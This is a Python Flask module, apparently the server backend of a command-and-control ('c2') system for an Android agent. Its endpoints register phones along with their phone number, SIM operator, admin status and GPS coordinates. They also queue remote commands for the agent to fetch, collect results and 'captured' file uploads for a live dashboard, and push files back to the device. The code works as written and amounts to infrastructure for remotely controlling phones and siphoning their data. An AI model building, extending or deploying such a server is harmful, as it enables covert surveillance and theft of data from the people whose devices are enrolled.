"""Endpoints consumed by the Android agent.

Agents authenticate with the shared key in ``X-Api-Key``. Every handler that
touches a device is scoped to the device id in the request body, so a leaked
or guessed key cannot reach other devices' commands.
"""

import json
import os
import uuid

from flask import Blueprint, request, jsonify, send_file

from config import Config
from c2.auth import agent_key_ok
from c2.file_handler import persist_upload, safe_join
from c2.timeutil import utcnow
from c2.ws_dashboard import broadcast
from database import db
from models import CapturedFile, Command, Device, LogEntry

agent_api = Blueprint("agent_api", __name__, url_prefix="/api/agent")

RESULT_MAX_CHARS = 512 * 1024
LOG_MAX_CHARS = 4096


def _auth():
    return agent_key_ok(request.headers.get("X-Api-Key"))


def _get_device(device_id):
    if not device_id or not isinstance(device_id, str):
        return None
    return Device.query.filter_by(device_id=device_id).first()


def _payload():
    data = request.get_json(silent=True)
    return data if isinstance(data, dict) else {}


@agent_api.route("/register", methods=["POST"])
def register():
    if not _auth():
        return jsonify({"error": "unauthorized"}), 401

    data = _payload()
    device_id = data.get("device_id") or str(uuid.uuid4())

    dev = _get_device(device_id)
    if not dev:
        dev = Device(device_id=device_id)
        db.session.add(dev)
        dev.first_seen = utcnow()

    dev.model = data.get("model", dev.model)
    dev.manufacturer = data.get("manufacturer", dev.manufacturer)
    dev.android_version = data.get("android_version", dev.android_version)
    sdk = data.get("sdk_int")
    if sdk is not None:
        try:
            dev.sdk_int = int(sdk)
        except (TypeError, ValueError):
            pass
    dev.hostname = data.get("hostname", dev.hostname)
    dev.ip_address = request.remote_addr
    battery = data.get("battery")
    if battery is not None:
        try:
            dev.battery = int(battery)
        except (TypeError, ValueError):
            pass
    dev.is_charging = bool(data.get("is_charging", dev.is_charging))
    dev.screen_on = bool(data.get("screen_on", dev.screen_on))
    dev.is_admin = bool(data.get("is_admin", dev.is_admin))
    dev.sim_operator = data.get("sim_operator", dev.sim_operator)
    dev.phone_number = data.get("phone_number", dev.phone_number)
    dev.agent_version = data.get("agent_version") or dev.agent_version
    if data.get("capabilities") is not None:
        dev.set_capabilities(data.get("capabilities"))
    dev.last_seen = utcnow()
    dev.is_online = True

    if data.get("latitude") is not None and data.get("longitude") is not None:
        dev.latitude = _as_float(data.get("latitude"))
        dev.longitude = _as_float(data.get("longitude"))
        dev.country = data.get("country", dev.country)
        dev.city = data.get("city", dev.city)

    db.session.commit()
    broadcast("device_update", dev.to_dict())
    return jsonify({"ok": True, "device_id": device_id})


def _as_float(value):
    try:
        return float(value)
    except (TypeError, ValueError):
        return 0.0


@agent_api.route("/poll", methods=["POST"])
def poll():
    if not _auth():
        return jsonify({"error": "unauthorized"}), 401

    data = _payload()
    dev = _get_device(data.get("device_id"))
    if not dev:
        return jsonify({"error": "unknown_device"}), 404

    dev.last_seen = utcnow()
    dev.is_online = True
    battery = data.get("battery")
    if battery is not None:
        try:
            dev.battery = int(battery)
        except (TypeError, ValueError):
            pass
    dev.is_charging = bool(data.get("is_charging", dev.is_charging))
    dev.screen_on = bool(data.get("screen_on", dev.screen_on))
    if data.get("latitude") is not None and data.get("longitude") is not None:
        dev.latitude = _as_float(data.get("latitude"))
        dev.longitude = _as_float(data.get("longitude"))
    db.session.commit()

    pending = (Command.query.filter_by(device_id=dev.id, status="pending")
               .order_by(Command.id.asc()).limit(20).all())
    for c in pending:
        c.status = "sent"
        c.delivered_at = utcnow()
    db.session.commit()

    broadcast("device_update", dev.to_dict())
    broadcast("device_update", dev.to_dict(), room="all_devices")

    return jsonify({
        "commands": [
            {"id": c.id, "type": c.command_type, "args": c.args()}
            for c in pending
        ]
    })


@agent_api.route("/result", methods=["POST"])
def result():
    if not _auth():
        return jsonify({"error": "unauthorized"}), 401

    data = _payload()
    dev = _get_device(data.get("device_id"))
    if not dev:
        return jsonify({"error": "unknown_device"}), 404

    raw_id = data.get("command_id")
    if raw_id is None:
        return jsonify({"error": "missing_command_id"}), 400
    try:
        cmd_id = int(raw_id)
    except (TypeError, ValueError):
        return jsonify({"error": "bad_command_id"}), 400

    cmd = db.session.get(Command, cmd_id)
    # Scope check: sequential ids mean "does it exist" is not enough.
    if not cmd or cmd.device_id != dev.id:
        return jsonify({"error": "unknown_command"}), 404

    cmd.result = json.dumps(data.get("result", {}))[:RESULT_MAX_CHARS]
    cmd.status = "done" if data.get("success") else "failed"
    cmd.completed_at = utcnow()
    db.session.commit()

    broadcast("command_result", cmd.to_dict())
    return jsonify({"ok": True})


@agent_api.route("/upload", methods=["POST"])
def upload():
    if not _auth():
        return jsonify({"error": "unauthorized"}), 401

    device_id = request.form.get("device_id")
    category = request.form.get("category", "misc")
    raw_cmd = request.form.get("command_id")
    command_id = int(raw_cmd) if raw_cmd and raw_cmd.isdigit() else None
    file = request.files.get("file")
    if not file or not device_id:
        return jsonify({"error": "bad_request"}), 400

    dev = _get_device(device_id)
    if not dev:
        return jsonify({"error": "unknown_device"}), 404

    # Only attribute the upload to a command that actually belongs here.
    if command_id is not None:
        cmd = db.session.get(Command, command_id)
        if not cmd or cmd.device_id != dev.id:
            command_id = None

    cf = persist_upload(
        device=dev,
        file_stream=file.stream,
        filename=file.filename,
        category=category,
        command_id=command_id,
        mime_hint=file.mimetype,
        metadata={
            "remote_ip": request.remote_addr,
            "user_agent": request.headers.get("User-Agent", ""),
        },
    )

    payload = cf.to_dict()
    broadcast("new_file", payload)
    broadcast("new_file", payload, room="all_devices")
    broadcast("new_file", payload, room=f"device_{dev.id}")

    return jsonify({"ok": True, "file_id": cf.id, "url": f"/api/file/{cf.id}/raw"})


@agent_api.route("/log", methods=["POST"])
def log():
    if not _auth():
        return jsonify({"error": "unauthorized"}), 401

    data = _payload()
    dev = _get_device(data.get("device_id"))
    entry = LogEntry(
        device_id=dev.id if dev else None,
        level=str(data.get("level", "info"))[:16],
        message=str(data.get("message", ""))[:LOG_MAX_CHARS],
        created_at=utcnow(),
    )
    db.session.add(entry)
    db.session.commit()

    broadcast("log", entry.to_dict())
    return jsonify({"ok": True})


@agent_api.route("/download/<path:filename>", methods=["GET"])
def download(filename):
    if not _auth():
        return jsonify({"error": "unauthorized"}), 401

    try:
        safe = safe_join(Config.UPLOAD_FOLDER, "to_agent", filename)
    except ValueError:
        return jsonify({"error": "forbidden"}), 403

    if not safe.is_file():
        return jsonify({"error": "not_found"}), 404

    return send_file(str(safe), as_attachment=True, download_name=safe.name)